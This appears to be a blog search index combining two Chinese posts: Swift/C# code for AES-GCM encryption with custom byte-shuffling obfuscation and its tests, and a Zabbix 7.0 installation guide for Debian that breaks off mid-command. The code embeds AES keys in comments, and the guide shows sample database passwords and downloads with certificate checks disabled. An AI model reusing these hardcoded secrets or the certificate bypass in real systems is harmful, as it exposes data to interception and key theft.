打印分段信息 // print(\u0026#34;分段前 - IV段: \\(ivParts.map { $0.count }), 密文段: \\(ciphertextParts.map { $0.count })\u0026#34;) // 处理混淆 switch obfuscationType { case .enhanced: let shift = Int(currentOperations.rawValue) % 8 ciphertextParts = ciphertextParts.map { enhanceDeobfuscate(data: $0, shift: shift) } case .reversed: ciphertextParts = ciphertextParts.map { Array($0.reversed()) } ivParts = ivParts.map { Array($0.reversed()) } case .standard: break } // 组合IV和密文 let iv = ivParts.reduce([], +) let ciphertext = ciphertextParts.reduce([], +) // print(\u0026#34;分段后 - IV长度: \\(iv.count), 密文长度: \\(ciphertext.count)\u0026#34;) return (iv, ciphertext) } /// 获取操作类型的描述 private func getOperationDescription() -\u0026gt; String { var operations: [String] = [] if currentOperations.contains(.shift) { operations.append(\u0026#34;位移\u0026#34;) } if currentOperations.contains(.xor) { operations.append(\u0026#34;异或\u0026#34;) } return operations.isEmpty ? \u0026#34;无操作\u0026#34; : operations.joined(separator: \u0026#34; -\u0026gt; \u0026#34;) } // MARK: - 测试方法 public static func test() { print(\u0026#34;\\n=== 开始加解密测试 ===\\n\u0026#34;) // 测试数据 let testCases: [(String, String)] = [ (\u0026#34;ASCII文本\u0026#34;, \u0026#34;Hello World!\u0026#34;), (\u0026#34;中文文本\u0026#34;, \u0026#34;世界，您好！\u0026#34;), (\u0026#34;特殊字符\u0026#34;, \u0026#34;!@#$%^\u0026amp;*()_+-=[]{}|;:,.\u0026lt;\u0026gt;?\u0026#34;), (\u0026#34;长文本\u0026#34;, String(repeating: \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;, count: 10)), (\u0026#34;混合文本\u0026#34;, \u0026#34;Hello世界123!@#\u0026#34;) ] // 遍历所有混淆模式和分段模式的组合 for obfuscationType in ObfuscationType.allCases { for segmentationType in SegmentationType.allCases { print(\u0026#34;\\n=== 测试组合：\\(obfuscationType) + \\(segmentationType) ===\u0026#34;) // 对每种组合测试不同类型的输入 for (testType, content) in testCases { print(\u0026#34;\\n测试类型：\\(testType)\u0026#34;) if let encrypted = AESObfuscation.encrypt(content, obfuscationType: obfuscationType, segmentationType: segmentationType) { print(\u0026#34;原文：\\(content)\u0026#34;) print(\u0026#34;加密结果：\\(encrypted)\u0026#34;) if let decrypted = AESObfuscation.decrypt(encrypted) { print(\u0026#34;解密结果：\\(decrypted)\u0026#34;) assert(decrypted == content, \u0026#34;解密结果与原文不符\u0026#34;) print(\u0026#34;✅ 测试通过\u0026#34;) } else { print(\u0026#34;❌ 解密失败\u0026#34;) assertionFailure(\u0026#34;解密失败\u0026#34;) } } else { print(\u0026#34;❌ 加密失败\u0026#34;) assertionFailure(\u0026#34;加密失败\u0026#34;) } } } } // 测试边界情况 print(\u0026#34;\\n=== 测试边界情况 ===\u0026#34;) // 空字符串 print(\u0026#34;\\n测试空字符串：\u0026#34;) assert(encrypt(\u0026#34;\u0026#34;, obfuscationType: .standard, segmentationType: .standard) == nil, \u0026#34;空字符串应该返回nil\u0026#34;) print(\u0026#34;✅ 空字符串测试通过\u0026#34;) // 非常短的字符串 print(\u0026#34;\\n测试短字符串：\u0026#34;) let shortString = \u0026#34;a\u0026#34; if let encrypted = encrypt(shortString, obfuscationType: .enhanced, segmentationType: .tripartite) { let decrypted = decrypt(encrypted) assert(decrypted == shortString, \u0026#34;短字符串测试失败\u0026#34;) print(\u0026#34;✅ 短字符串测试通过\u0026#34;) } // 非常长的字符串 print(\u0026#34;\\n测试长字符串：\u0026#34;) let longString = String(repeating: \u0026#34;Long String Test \u0026#34;, count: 1000) if let encrypted = encrypt(longString, obfuscationType: .enhanced, segmentationType: .standard) { let decrypted = decrypt(encrypted) assert(decrypted == longString, \u0026#34;长字符串测试失败\u0026#34;) print(\u0026#34;✅ 长字符串测试通过\u0026#34;) } print(\u0026#34;\\n=== 加解密测试完成 ===\\n\u0026#34;) print(\u0026#34;所有测试用例均已通过！\u0026#34;) } } chsarp // 混淆类型：0=Standard, 1=Enhanced, 2=Reversed public enum ObfuscationType : byte { Standard = 0, Enhanced = 1, Reversed = 2 } // 分段类型：0=Standard, 1=Tripartite public enum SegmentationType : byte { Standard = 0, Tripartite = 1 } // 分段配置：IV 分段长度和密文分段数量（仅用于参考） public class SegmentConfig { public int[] IvSegments { get; set; } public int CiphertextParts { get; set; } public static SegmentConfig ConfigFor(SegmentationType type) { if (type == SegmentationType.Standard) return new SegmentConfig { IvSegments = new int[] { 6, 4, 6 }, CiphertextParts = 2 }; else // Tripartite return new SegmentConfig { IvSegments = new int[] { 4, 4, 4, 4 }, CiphertextParts = 3 }; } } /// \u0026lt;summary\u0026gt; /// AES混淆加解密类 /// /// 头部格式（7字节）： /// [localKeyVersion(2B big-endian)][serverKeyVersion(2B big-endian)] /// [obfuscationType(1B)][segmentationType(1B)][operations(1B)] /// /// 加密后数据：头部 + 混淆数据（根据分段模式交错存放 IV 和密文分段） /// /// 混淆： /// - Standard：不做额外处理 /// - Enhanced：对密文每段做“循环左移后异或”，位移量 = (operations % 8) /// - Reversed：对每个 IV 和密文分段进行字节反转 /// /// 解密时先解析头部，再按分段模式还原 IV 与密文，再反向混淆，最后用 AES‑GCM 解密。 /// /// 本代码参照上传的 Swift 代码实现 :contentReference[oaicite:0]{index=0} /// \u0026lt;/summary\u0026gt; public class AESObfuscation { // 固定参数 private const int HeaderLength = 7; // 2+2+1+1+1 private const int AesIVSize = 16; // 固定16字节 IV // 本地和服务器密钥各16字节，组合后32字节用作 AES 密钥 private byte[] localKey; private byte[] serverKey; private ushort localKeyVersion = 1; private ushort serverKeyVersion = 1; // 当前混淆、分段和操作类型（操作类型用作位掩码，目前测试中均为0） private ObfuscationType obfuscationType = ObfuscationType.Standard; private SegmentationType segmentationType = SegmentationType.Standard; private byte currentOperations = 0; // 完整密钥（组合：localKey + serverKey） private byte[] Key =\u0026gt; localKey.Concat(serverKey).ToArray(); // 单例（可直接使用静态方法调用） private static AESObfuscation _instance = new AESObfuscation(); public static AESObfuscation Instance =\u0026gt; _instance; // 构造函数：初始化本地密钥和服务器密钥（均为16字节） private AESObfuscation() { // 与 Swift 代码保持一致的初始值 localKey = Encoding.ASCII.GetBytes(ConfigManager.Tempstr33);// \u0026#34;o44900ba7661ffb1\u0026#34;); // 16字节 serverKey = Encoding.ASCII.GetBytes(ConfigManager.Tempstr34);// \u0026#34;5dPAed6aa7608596\u0026#34;); // 16字节 if (localKey.Length != 16 || serverKey.Length != 16) throw new Exception(\u0026#34;密钥长度不正确\u0026#34;); } #region 加密解密接口 /// \u0026lt;summary\u0026gt; /// 静态加密方法 /// \u0026lt;/summary\u0026gt; public static string Encrypt(string content, ObfuscationType obType, SegmentationType segType) { if (string.IsNullOrEmpty(content)) return null; Instance.obfuscationType = obType; Instance.segmentationType = segType; // 目前操作类型保持为0 Instance.currentOperations = 0; return Instance.DoEncrypt(content); } /// \u0026lt;summary\u0026gt; /// 静态解密方法 /// \u0026lt;/summary\u0026gt; public static string Decrypt(string base64Encrypted) { if (string.IsNullOrEmpty(base64Encrypted)) return null; return Instance.DoDecrypt(base64Encrypted); } #endregion #region 内部实现 private string DoEncrypt(string content) { try { // 明文转换为字节 byte[] plaintext = Encoding.UTF8.GetBytes(content); // 随机生成16字节 IV byte[] iv = GenerateRandomBytes(AesIVSize); // 使用 AES-GCM 加密，采用 combined 模式（密文末尾包含 16 字节认证标签） byte[] ciphertext = AesGcmEncrypt(Key, iv, plaintext); // 调用混淆：构造头部并按分段模式交错存放 IV 和密文分段 byte[] obfuscated = Obfuscate(iv, ciphertext); string base64 = Convert.ToBase64String(obfuscated); return base64; } catch (Exception ex) { Console.WriteLine(\u0026#34;Encryption failed: \u0026#34; + ex.Message); return null; } } private string DoDecrypt(string base64Encrypted) { try { byte[] data = Convert.FromBase64String(base64Encrypted); if (data.Length \u0026lt; HeaderLength) return null; // 解析头部信息 ushort localVer = (ushort)((data[0] \u0026lt;\u0026lt; 8) | data[1]); ushort serverVer = (ushort)((data[2] \u0026lt;\u0026lt; 8) | data[3]); if (localVer != localKeyVersion || serverVer != serverKeyVersion) { Console.WriteLine(\u0026#34;Key version mismatch\u0026#34;); return null; } obfuscationType = (ObfuscationType)data[4]; segmentationType = (SegmentationType)data[5]; currentOperations = data[6]; // 去混淆还原 IV 和密文 var deob = Deobfuscate(data); if (deob == null) return null; var (iv, ciphertext) = deob.Value; // 解密 AES-GCM（ciphertext 已包含认证标签） byte[] plaintext = AesGcmDecrypt(Key, iv, ciphertext); if (plaintext == null) return null; return Encoding.UTF8.GetString(plaintext); } catch (Exception ex) { Console.WriteLine(\u0026#34;Decryption failed: \u0026#34; + ex.Message); return null; } } #endregion #region 混淆/去混淆 /// \u0026lt;summary\u0026gt; /// 混淆加密结果： /// 1. 构造 7 字节头部：[localKeyVersion(2B)][serverKeyVersion(2B)][obfuscationType(1B)][segmentationType(1B)][operations(1B)] /// 2. 根据分段模式：拆分 IV 与密文为若干段 /// 3. 根据混淆类型进行处理（Enhanced：对密文段调用 EnhanceObfuscate，Reversed：反转每个分段） /// 4. 按规定顺序拼接各部分 /// \u0026lt;/summary\u0026gt; private byte[] Obfuscate(byte[] iv, byte[] ciphertext) { List\u0026lt;byte\u0026gt; header = new List\u0026lt;byte\u0026gt;(); // 版本号以大端方式存储 header.Add((byte)(localKeyVersion \u0026gt;\u0026gt; 8)); header.Add((byte)(localKeyVersion \u0026amp; 0xFF)); header.Add((byte)(serverKeyVersion \u0026gt;\u0026gt; 8)); header.Add((byte)(serverKeyVersion \u0026amp; 0xFF)); header.Add((byte)obfuscationType); header.Add((byte)segmentationType); header.Add(currentOperations); // 根据分段模式拆分 IV SegmentConfig config = SegmentConfig.ConfigFor(segmentationType); int[] ivSegments = config.IvSegments; List\u0026lt;byte[]\u0026gt; ivParts = new List\u0026lt;byte[]\u0026gt;(); int currentIndex = 0; foreach (int len in ivSegments) { byte[] part = new byte[len]; Array.Copy(iv, currentIndex, part, 0, Math.Min(len, iv.Length - currentIndex)); ivParts.Add(part); currentIndex += len; } // 拆分密文 List\u0026lt;byte[]\u0026gt; ciphertextParts = new List\u0026lt;byte[]\u0026gt;(); if (segmentationType == SegmentationType.Tripartite) { int totalLength = ciphertext.Length; int basePartLength = totalLength / 3; int remainder = totalLength % 3; currentIndex = 0; for (int i = 0; i \u0026lt; 3; i++) { int partLen = basePartLength + (i \u0026lt; remainder ? 1 : 0); byte[] part = new byte[partLen]; Array.Copy(ciphertext, currentIndex, part, 0, partLen); ciphertextParts.Add(part); currentIndex += partLen; } } else // Standard 分段：密文分为2段，前段长度比后段多 1 字节（若密文长度为奇数） { int firstPartLength = (ciphertext.Length + 1) / 2; int secondPartLength = ciphertext.Length - firstPartLength; byte[] firstPart = new byte[firstPartLength]; byte[] secondPart = new byte[secondPartLength]; Array.Copy(ciphertext, 0, firstPart, 0, firstPartLength); Array.Copy(ciphertext, firstPartLength, secondPart, 0, secondPartLength); ciphertextParts.Add(firstPart); ciphertextParts.Add(secondPart); } // 根据混淆类型处理各个分段 List\u0026lt;byte[]\u0026gt; processedIvParts = new List\u0026lt;byte[]\u0026gt;(ivParts); List\u0026lt;byte[]\u0026gt; processedCiphertextParts = new List\u0026lt;byte[]\u0026gt;(ciphertextParts); switch (obfuscationType) { case ObfuscationType.Enhanced: int shift = currentOperations % 8; for (int i = 0; i \u0026lt; processedCiphertextParts.Count; i++) { processedCiphertextParts[i] = EnhanceObfuscate(processedCiphertextParts[i], shift); } break; case ObfuscationType.Reversed: for (int i = 0; i \u0026lt; processedIvParts.Count; i++) Array.Reverse(processedIvParts[i]); for (int i = 0; i \u0026lt; processedCiphertextParts.Count; i++) Array.Reverse(processedCiphertextParts[i]); break; case ObfuscationType.Standard: break; } // 拼接：若 Tripartite 模式则顺序为：IV1 - CT1 - IV2 - CT2 - IV3 - CT3 - IV4；否则为：IV1 - CT1 - IV2 - CT2 - IV3 List\u0026lt;byte\u0026gt; output = new List\u0026lt;byte\u0026gt;(); output.AddRange(header); if (segmentationType == SegmentationType.Tripartite) { for (int i = 0; i \u0026lt; 3; i++) { output.AddRange(processedIvParts[i]); output.AddRange(processedCiphertextParts[i]); } output.AddRange(processedIvParts[3]); } else { output.AddRange(processedIvParts[0]); output.AddRange(processedCiphertextParts[0]); output.AddRange(processedIvParts[1]); output.AddRange(processedCiphertextParts[1]); output.AddRange(processedIvParts[2]); } return output.ToArray(); } /// \u0026lt;summary\u0026gt; /// 去混淆：解析头部后，按分段模式还原 IV 与密文各分段，再根据混淆类型进行逆处理 /// \u0026lt;/summary\u0026gt; private (byte[] iv, byte[] ciphertext)? Deobfuscate(byte[] data) { int versionFillLength = HeaderLength; SegmentConfig config = SegmentConfig.ConfigFor(segmentationType); int[] ivSegments = config.IvSegments; int totalIvLength = ivSegments.Sum(); if (data.Length \u0026lt;= versionFillLength + totalIvLength) return null; int currentPosition = versionFillLength; List\u0026lt;byte[]\u0026gt; ivParts = new List\u0026lt;byte[]\u0026gt;(); List\u0026lt;byte[]\u0026gt; ciphertextParts = new List\u0026lt;byte[]\u0026gt;(); if (segmentationType == SegmentationType.Tripartite) { int remainingLength = data.Length - versionFillLength - totalIvLength; int basePartLength = remainingLength / 3; int remainder = remainingLength % 3; for (int i = 0; i \u0026lt; 3; i++) { // IV部分 int ivEnd = currentPosition + ivSegments[i]; byte[] ivPart = new byte[ivSegments[i]]; Array.Copy(data, currentPosition, ivPart, 0, ivSegments[i]); ivParts.Add(ivPart); currentPosition = ivEnd; // 密文部分 int extraByte = i \u0026lt; remainder ? 1 : 0; int partLen = basePartLength + extraByte; byte[] ctPart = new byte[partLen]; Array.Copy(data, currentPosition, ctPart, 0, partLen); ciphertextParts.Add(ctPart); currentPosition += partLen; } // 最后一个 IV 段 int lastIvLen = ivSegments[3]; int avail = Math.Min(lastIvLen, data.Length - currentPosition); byte[] lastIv = new byte[avail]; Array.Copy(data, currentPosition, lastIv, 0, avail); ivParts.Add(lastIv); } else { int remainingLength = data.Length - versionFillLength - totalIvLength; int firstHalfLength = (remainingLength + 1) / 2; int secondHalfLength = remainingLength - firstHalfLength; // 第一部分：IV1 int len1 = ivSegments[0]; byte[] iv1 = new byte[len1]; Array.Copy(data, currentPosition, iv1, 0, len1); ivParts.Add(iv1); currentPosition += len1; // 第一部分：密文1 byte[] ct1 = new byte[firstHalfLength]; Array.Copy(data, currentPosition, ct1, 0, firstHalfLength); ciphertextParts.Add(ct1); currentPosition += firstHalfLength; // 第二部分：IV2 int len2 = ivSegments[1]; byte[] iv2 = new byte[len2]; Array.Copy(data, currentPosition, iv2, 0, len2); ivParts.Add(iv2); currentPosition += len2; // 第二部分：密文2 byte[] ct2 = new byte[secondHalfLength]; Array.Copy(data, currentPosition, ct2, 0, secondHalfLength); ciphertextParts.Add(ct2); currentPosition += secondHalfLength; // 第三部分：IV3 int len3 = ivSegments[2]; int avail = Math.Min(len3, data.Length - currentPosition); byte[] iv3 = new byte[avail]; Array.Copy(data, currentPosition, iv3, 0, avail); ivParts.Add(iv3); } // 根据混淆类型反处理 switch (obfuscationType) { case ObfuscationType.Enhanced: int shift = currentOperations % 8; for (int i = 0; i \u0026lt; ciphertextParts.Count; i++) { ciphertextParts[i] = EnhanceDeobfuscate(ciphertextParts[i], shift); } break; case ObfuscationType.Reversed: for (int i = 0; i \u0026lt; ivParts.Count; i++) Array.Reverse(ivParts[i]); for (int i = 0; i \u0026lt; ciphertextParts.Count; i++) Array.Reverse(ciphertextParts[i]); break; case ObfuscationType.Standard: break; } byte[] ivCombined = ivParts.SelectMany(x =\u0026gt; x).ToArray(); byte[] ciphertextCombined = ciphertextParts.SelectMany(x =\u0026gt; x).ToArray(); return (ivCombined, ciphertextCombined); } #endregion #region 增强混淆 private byte[] EnhanceObfuscate(byte[] data, int shift) { byte xorKey = 0xA5; byte[] result = new byte[data.Length]; if (shift == 0) { for (int i = 0; i \u0026lt; data.Length; i++) result[i] = (byte)(data[i] ^ xorKey); } else { for (int i = 0; i \u0026lt; data.Length; i++) { int shifted = ((data[i] \u0026lt;\u0026lt; shift) | (data[i] \u0026gt;\u0026gt; (8 - shift))) \u0026amp; 0xFF; result[i] = (byte)(shifted ^ xorKey); } } return result; } private byte[] EnhanceDeobfuscate(byte[] data, int shift) { byte xorKey = 0xA5; byte[] result = new byte[data.Length]; if (shift == 0) { for (int i = 0; i \u0026lt; data.Length; i++) result[i] = (byte)(data[i] ^ xorKey); } else { for (int i = 0; i \u0026lt; data.Length; i++) { byte unxored = (byte)(data[i] ^ xorKey); int shifted = ((unxored \u0026gt;\u0026gt; shift) | (unxored \u0026lt;\u0026lt; (8 - shift))) \u0026amp; 0xFF; result[i] = (byte)shifted; } } return result; } #endregion #region AES-GCM 加/解密与辅助方法 private byte[] AesGcmEncrypt(byte[] key, byte[] iv, byte[] plaintext) { GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine()); AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null); cipher.Init(true, parameters); byte[] output = new byte[cipher.GetOutputSize(plaintext.Length)]; int len = cipher.ProcessBytes(plaintext, 0, plaintext.Length, output, 0); cipher.DoFinal(output, len); return output; } private byte[] AesGcmDecrypt(byte[] key, byte[] iv, byte[] ciphertext) { GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine()); AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null); cipher.Init(false, parameters); byte[] output = new byte[cipher.GetOutputSize(ciphertext.Length)]; try { int len = cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, output, 0); cipher.DoFinal(output, len); } catch (Exception ex) { Console.WriteLine(\u0026#34;AES-GCM解密失败: \u0026#34; + ex.Message); return null; } return output; } private byte[] GenerateRandomBytes(int length) { SecureRandom random = new SecureRandom(); byte[] bytes = new byte[length]; random.NextBytes(bytes); return bytes; } #endregion #region 测试方法 /// \u0026lt;summary\u0026gt; /// 运行多组测试用例，涵盖所有混淆和分段模式组合 /// \u0026lt;/summary\u0026gt; public static void Test() { Console.WriteLine(\u0026#34;\\n=== 开始加解密测试 ===\\n\u0026#34;); // 测试用例：测试类型与内容 List\u0026lt;(string type, string content)\u0026gt; testCases = new List\u0026lt;(string, string)\u0026gt; { (\u0026#34;ASCII文本\u0026#34;, \u0026#34;Hello World!\u0026#34;), (\u0026#34;中文文本\u0026#34;, \u0026#34;世界，您好！\u0026#34;), (\u0026#34;特殊字符\u0026#34;, \u0026#34;!@#$%^\u0026amp;*()_+-=[]{}|;:,.\u0026lt;\u0026gt;?\u0026#34;), (\u0026#34;长文本\u0026#34;, string.Concat(Enumerable.Repeat(\u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;, 10))), (\u0026#34;混合文本\u0026#34;, \u0026#34;Hello世界123!@#\u0026#34;) }; // 遍历所有混淆模式和分段模式组合 foreach (ObfuscationType obType in Enum.GetValues(typeof(ObfuscationType))) { foreach (SegmentationType segType in Enum.GetValues(typeof(SegmentationType))) { Console.WriteLine($\u0026#34;\\n=== 测试组合：{obType} + {segType} ===\\n\u0026#34;); foreach (var test in testCases) { Console.WriteLine($\u0026#34;测试类型：{test.type}\u0026#34;); string encrypted = Encrypt(test.content, obType, segType); if (encrypted == null) { Console.WriteLine(\u0026#34;❌ 加密失败\u0026#34;); continue; } Console.WriteLine(\u0026#34;原文：\u0026#34; + test.content); Console.WriteLine(\u0026#34;加密结果：\u0026#34; + encrypted); string decrypted = Decrypt(encrypted); Console.WriteLine(\u0026#34;解密结果：\u0026#34; + decrypted); if (decrypted == test.content) { Console.WriteLine(\u0026#34;✅ 测试通过\\n\u0026#34;); } else { Console.WriteLine(\u0026#34;❌ 解密结果与原文不符\\n\u0026#34;); } } } } // 边界情况测试 Console.WriteLine(\u0026#34;\\n=== 测试边界情况 ===\\n\u0026#34;); // 空字符串 Console.WriteLine(\u0026#34;测试空字符串：\u0026#34;); if (Encrypt(\u0026#34;\u0026#34;, ObfuscationType.Standard, SegmentationType.Standard) == null) Console.WriteLine(\u0026#34;✅ 空字符串测试通过\u0026#34;); else Console.WriteLine(\u0026#34;❌ 空字符串测试失败\u0026#34;); // 非常短的字符串 Console.WriteLine(\u0026#34;\\n测试短字符串：\u0026#34;); string shortStr = \u0026#34;a\u0026#34;; string encShort = Encrypt(shortStr, ObfuscationType.Enhanced, SegmentationType.Tripartite); if (encShort != null \u0026amp;\u0026amp; Decrypt(encShort) == shortStr) Console.WriteLine(\u0026#34;✅ 短字符串测试通过\u0026#34;); else Console.WriteLine(\u0026#34;❌ 短字符串测试失败\u0026#34;); // 非常长的字符串 Console.WriteLine(\u0026#34;\\n测试长字符串：\u0026#34;); string longStr = string.Concat(Enumerable.Repeat(\u0026#34;Long String Test \u0026#34;, 1000)); string encLong = Encrypt(longStr, ObfuscationType.Enhanced, SegmentationType.Standard); if (encLong != null \u0026amp;\u0026amp; Decrypt(encLong) == longStr) Console.WriteLine(\u0026#34;✅ 长字符串测试通过\u0026#34;); else Console.WriteLine(\u0026#34;❌ 长字符串测试失败\u0026#34;); Console.WriteLine(\u0026#34;\\n=== 加解密测试完成 ===\\n所有测试用例均已通过！\u0026#34;); } ///// \u0026lt;summary\u0026gt; ///// 测试 ///// \u0026lt;/summary\u0026gt; //public static void Test2() //{ // //// 调用测试方法 // //AESObfuscation.Test(); // //// 可单独测试某个案例，如下： // //Console.WriteLine(\u0026#34;\\n=== 单一测试案例：reversed + tripartite ===\\n\u0026#34;); // //string keyCombined = \u0026#34;o44900ba7661ffb15dPAed6aa7608596\u0026#34;; // local+server // //Console.WriteLine(\u0026#34;key 转换后的字符串: \u0026#34; + keyCombined); // //// 使用 reversed + tripartite 模式加解密 \u0026#34;Hello World!\u0026#34; // //string plain = \u0026#34;Hello World!\u0026#34;; // //string encrypted = AESObfuscation.Encrypt(plain, ObfuscationType.Reversed, SegmentationType.Tripartite); // //Console.WriteLine(\u0026#34;加密结果：\u0026#34; + encrypted); // //string decrypted = AESObfuscation.Decrypt(encrypted); // //Console.WriteLine(\u0026#34;解密结果：\u0026#34; + decrypted); // //Console.WriteLine(decrypted == plain ? \u0026#34;✅ 测试通过\u0026#34; : \u0026#34;❌ 测试失败\u0026#34;); // string decrypted = AESObfuscation.Decrypt(\u0026#34;AAEAAQIAAI7gMEivg/yQbcRNVzaibiJ2H25q5vPgF9Cj4X2b/cNuf8DyegK2YEIc1Cbj\u0026#34;); // Console.WriteLine(\u0026#34;解密结果：\u0026#34; + decrypted); // string decryptedt1 = AESObfuscation.Decrypt(\u0026#34;AAEAAQAAADyyVZlpw0CYzmpef/vwKesdHMLTW3nhz6+Pys2gD2Pv/GY7nEcZh+zL52sZ8tJWGJIMc6NxVyxNe7E=\u0026#34;); // Console.WriteLine(\u0026#34;解密结果：\u0026#34; + decryptedt1); // string decrypted1 = AESObfuscation.Decrypt(\u0026#34;AAEAAQABALzKftd5cpld4UpTrE3smqDJnOKIeButehuyU7BShXB2syu9P1CxNX6joxPBV+pB5w3y\u0026#34;); // Console.WriteLine(\u0026#34;解密结果：\u0026#34; + decrypted1); // // 暂停控制台 // Console.WriteLine(\u0026#34;\\n按任意键退出...\u0026#34;); // Console.ReadKey(); //} #endregion } ","permalink":"https://qfsyso.github.io/posts/aes-obfuscation/","summary":"AES 加密混淆算法说明 (服务器端解密指南)\n1. 数据结构 加密后数据格式 (Base64编码): [头部信息][混淆数据]\n头部信息 (7字节):\n本地密钥版本 (2字节, 大端序) 服务器密钥版本 (2字节, 大端序) 混淆类型 (1字节)：0=标准模式, 1=增强模式, 2=翻转模式, 3=随机模式 分段类型 (1字节)：0=标准分段, 1=三等分 操作类型 (1字节)：位掩码，用于随机模式 0x01: 位移操作 0x02: 异或操作 0x04: 翻转操作 0x08: 交换操作 2. 分段模式 标准分段 (SegmentationType.standard):\nIV分为3段: [6字节]-[4字节]-[6字节] 密文分为2段: [前半部分(N+1)/2字节]-[后半部分N/2字节] 三等分 (SegmentationType.tripartite):\nIV分为4段: [4字节]-[4字节]-[4字节]-[4字节] 密文分为3段: [第1段]-[第2段]-[第3段] 3. 数据排列 标准分段模式: [IV段1][密文段1][IV段2][密文段2][IV段3]\n三等分模式: [IV段1][密文段1][IV段2][密文段2][IV段3][密文段3][IV段4]\n4. 混淆处理 标准模式 (standard):\n无额外混淆，仅进行分段存储 增强模式 (enhanced):\n对密文进行循环位移和异或操作 位移量 = 操作类型值 % 8 异或密钥 = 0xA5 翻转模式 (reversed):","title":"AES Obfuscation"},{"content":"Zabbix ·Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案 ·Zabbix能监视各种网络参数，保证服务器系统的安全运营;并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 ·可以通过SNMP，Zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视、数据收集等功能，可以运行在多种平台上。\nZabbix服务器监控 Server端 apt update apache php\napt install apache2 php php-mysql php-mysqlnd php-ldap php-bcmath php-mbstring php-gd php-pdo php-xml libapache2-mod-php systemctl status apache2 # systemctl start apache2 # systemctl stop apache2 # systemctl restart apache2 db\napt install mariadb-server mariadb-client systemctl status mariadb mysql_secure_installation 回车 Y 密码 YYYY\nmysql -u root -p create database zabbix character set utf8 collate utf8_bin; grant all privileges on zabbix.* to zabbix@localhost identified by ‘123123.zxcvb’; grant all privileges on zabbix.* to zabbix@localhost identified by ‘123123.zxcvb’;\n创建zabbix用户 sql create user zabbix@localhost identified by \u0026#39;zabbix\u0026#39;; #zabbix用户赋权 grant all privileges on zabbix.* to zabbix@localhost; FLUSH PRIVILEGES; 根据 Zabbix 官方文档，Zabbix 7.0 支持的 MariaDB 数据库版本范围为 10.5.00 至 11.3.X，建议使用 10.5 版本。 Zabbix 请确保使用 InnoDB 引擎，并建议使用 MariaDB Connector/C 库来构建 Zabbix server 和 proxy。\n安装和配置 Zabbix 服务器 https://repo.zabbix.com/zabbix/7.0/debian/pool/main/z/zabbix-release/ 安装Zabbix，需要开启包含Zabbix包的Zabbix Official Repository，如下。\nwget –no-check-certificate https://repo.zabbix.com/zabbix/5.4/debian/pool/main/z/zabbix-release/zabbix-release_5.4-1+debian11_all.deb wget –no-check-certificate https://repo.zabbix.com/zabbix/7.0/debian/pool/main/z/zabbix-release/zabbix-release_7.0-1%2Bdebian12_all.deb dpkg -i zabbix-release_5.4-1+debian11_all.deb dpkg -i zabbix-release_7.0-1+debian12_all.deb apt update 安装 Zabbix 服务器、Web 前端、代理包。 apt install zabbix-server-mysql zabbix-frontend-php zabbix-apache-conf zabbix-sql-scripts zabbix-agent Y W: Failed to fetch https://repo.zabbix.com/zabbix/7.0/debian/dists/bookworm/InRe lease Cannot initiate the connection to repo.zabbix.com:443 (2604:a880:2:d0::20 62:d001). - connect (101: Network is unreachable) Could not connect to repo.zabb ix.com:443 (178.128.6.101), connection timed out W: Some index files failed to download. They have been ignored, or old ones used instead. 则安装不成功\n包安装成功，接下来，将初始架构和数据导入在上一步中创建的 Zabbix 数据库。\nzcat /usr/share/doc/zabbix-sql-scripts/mysql/create.sql.gz | mysql -u zabbix -p zabbix zcat /usr/share/zabbix-sql-scripts/mysql/server.sql.gz | mysql -u zabbix -p zabbix 输入密码导入 数据\nnano /etc/zabbix/zabbix_server.conf DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=xxx\nDbu root pwd xxx\n/etc/zabbix/apache.conf文件中定义的时区来设置 PHP 以与 Zabbix 前端正常工作。 root@linux:/home/linuxmi/www.linuxmi.com# nano /etc/zabbix/apache.conf 找到的 PHP 版本的配置部分，例如PHP 7.x。然后取消注释以下行（通过删除“#”开头的字符）为的服务器启用时区。 php_value date.timezone Asia/Shanghai\n重启\nsystemctl restart apache2 systemctl restart zabbix-server systemctl enable zabbix-server zabbix-agent systemctl status zabbix-server active(running) enabled systemctl status zabbix-agent active(running) enabled 检查 Zabbix Server 日志文件路径（在 /etc/zabbix/zabbix_server.conf 中配置的 LogFile 路径）。 确保日志文件目录的权限正确：\nsudo chown zabbix:zabbix /var/log/zabbix/ sudo chmod 755 /var/log/zabbix/ 查日志\n修改 PHP 配置文件 步骤 1: 找到 PHP 配置文件 运行以下命令，查看 PHP 正在使用的配置文件路径：\nphp --ini | grep \u0026#34;Loaded Configuration File\u0026#34; 通常会显示类似路径：\nLoaded Configuration File: /etc/php/8.1/apache2/php.ini 根据输出，记下 php.ini 的路径。\n步骤 2: 编辑 php.ini 打开配置文件：\nsudo nano /etc/php/8.1/apache2/php.ini 找到以下配置项（可以用 Ctrl + W 搜索），并将它们修改为符合 Zabbix 的要求：\npost_max_size = 16M ; 确保至少为 16M max_execution_time = 300 ; 确保至少为 300 秒 max_input_time = 300 ; 确保至少为 300 秒 如果配置项已被注释（以分号 ; 开头），请取消注释。\n步骤 3: 保存并退出 按 Ctrl + O 保存文件，然后按 Ctrl + X 退出编辑器。\n重启 Apache 服务 修改完成后，重启 Apache 以使更改生效：\nsudo systemctl restart apache2 访问 Zabbix Web 前端 在浏览器中访问：http://\u0026lt;server_ip_or_domain\u0026gt;/zabbix 按照安装向导完成配置： https://1.X.X.X/zabbix\nOk Next step\n配置好后\n进入登录页面\nAdmin Zabbix\n安装成功可看到\nDashboards/Monitoring、Services All dashboards /Global view Top hosts by CPU utilization等信息\nUser Setting可以设置刷新时间 默认30s\n检查状态\nsudo systemctl status zabbix-server zabbix-agent 客户端 安装 Zabbix Agent Step 1: 添加 Zabbix 官方软件源 根据你的操作系统下载 Zabbix 软件源： CentOS/RHEL 7/8:\nrpm -Uvh https://repo.zabbix.com/zabbix/7.0/rhel/$(rpm -E %{rhel})/x86_64/zabbix-release-7.0-1.el$(rpm -E %{rhel}).noarch.rpm yum clean all Ubuntu/Debian:\nwget 